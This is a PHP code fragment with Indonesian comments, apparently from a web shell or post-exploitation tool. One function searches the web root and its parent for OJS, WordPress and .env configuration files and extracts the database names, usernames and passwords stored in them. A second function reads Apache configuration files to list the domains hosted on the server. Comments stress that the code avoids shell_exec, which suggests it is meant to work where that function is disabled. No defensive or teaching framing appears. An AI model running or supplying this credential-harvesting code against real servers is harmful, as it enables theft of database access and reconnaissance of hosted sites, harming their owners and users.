function huntDatabaseCredentials() {
    $found = [];
    
    // Path yang umum ditemui (tanpa shell_exec)
    $common_paths = [
        // OJS
        $_SERVER['DOCUMENT_ROOT'] . '/config.inc.php',
        dirname($_SERVER['DOCUMENT_ROOT']) . '/config.inc.php',
        getcwd() . '/config.inc.php',
        '/home/*/public_html/*/config.inc.php',
        
        // WordPress
        $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php',
        dirname($_SERVER['DOCUMENT_ROOT']) . '/wp-config.php',
        
        // .env
        $_SERVER['DOCUMENT_ROOT'] . '/.env',
        dirname($_SERVER['DOCUMENT_ROOT']) . '/.env',
    ];
    
    // Scan current directory and parent
    $dirs_to_check = [
        $_SERVER['DOCUMENT_ROOT'],
        dirname($_SERVER['DOCUMENT_ROOT']),
        getcwd(),
        dirname(getcwd())
    ];
    
    foreach ($dirs_to_check as $base_dir) {
        if (!$base_dir || !is_dir($base_dir)) continue;
        
        // Check config.inc.php
        $config_file = $base_dir . '/config.inc.php';
        if (file_exists($config_file)) {
            $content = @file_get_contents($config_file);
            if ($content) {
                $db_info = [];
                if (preg_match('/name\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_name'] = $m[1];
                if (preg_match('/username\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_user'] = $m[1];
                if (preg_match('/password\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_pass'] = $m[1];
                if (!empty($db_info)) {
                    $found[] = ['type' => 'OJS Config', 'file' => $config_file, 'credentials' => $db_info];
                }
            }
        }
        
        // Check wp-config.php
        $wp_file = $base_dir . '/wp-config.php';
        if (file_exists($wp_file)) {
            $content = @file_get_contents($wp_file);
            if ($content) {
                $db_info = [];
                if (preg_match("/DB_NAME',\s*'([^']+)'/", $content, $m)) $db_info['db_name'] = $m[1];
                if (preg_match("/DB_USER',\s*'([^']+)'/", $content, $m)) $db_info['db_user'] = $m[1];
                if (preg_match("/DB_PASSWORD',\s*'([^']+)'/", $content, $m)) $db_info['db_pass'] = $m[1];
                if (!empty($db_info)) {
                    $found[] = ['type' => 'WordPress Config', 'file' => $wp_file, 'credentials' => $db_info];
                }
            }
        }
        
        // Check .env
        $env_file = $base_dir . '/.env';
        if (file_exists($env_file)) {
            $content = @file_get_contents($env_file);
            if ($content) {
                $db_info = [];
                if (preg_match('/DB_DATABASE=(.+)/', $content, $m)) $db_info['db_name'] = trim($m[1]);
                if (preg_match('/DB_USERNAME=(.+)/', $content, $m)) $db_info['db_user'] = trim($m[1]);
                if (preg_match('/DB_PASSWORD=(.+)/', $content, $m)) $db_info['db_pass'] = trim($m[1]);
                if (!empty($db_info)) {
                    $found[] = ['type' => '.env File', 'file' => $env_file, 'credentials' => $db_info];
                }
            }
        }
    }
    
    return $found;
}

// FUNGSI: DAPETIN DOMAIN (NO SHELL_EXEC)
// ============================================
function getAllDomains() {
    $domains = [];
    
    // Current domain
    if (isset($_SERVER['HTTP_HOST'])) {
        $domains[] = $_SERVER['HTTP_HOST'];
    }
    
    // Try to read from Apache config jika bisa (limited)
    $apache_configs = [
        '/etc/apache2/sites-available/000-default.conf',
        '/etc/apache2/sites-enabled/000-default.conf',
        '/usr/local/apache2/conf/httpd.conf'
    ];
    
    foreach ($apache_configs as $conf) {
        if (file_exists($conf)) {
            $content = @file_get_contents($conf);
            if ($content && preg_match_all('/ServerName\s+([^\s]+)/', $content, $matches)) {
                foreach ($matches[1] as $domain) {
                    $domains[] = $domain;
                }
            }
        }
    }
    
    $domains = array_unique($domains);
    return $domains;
}
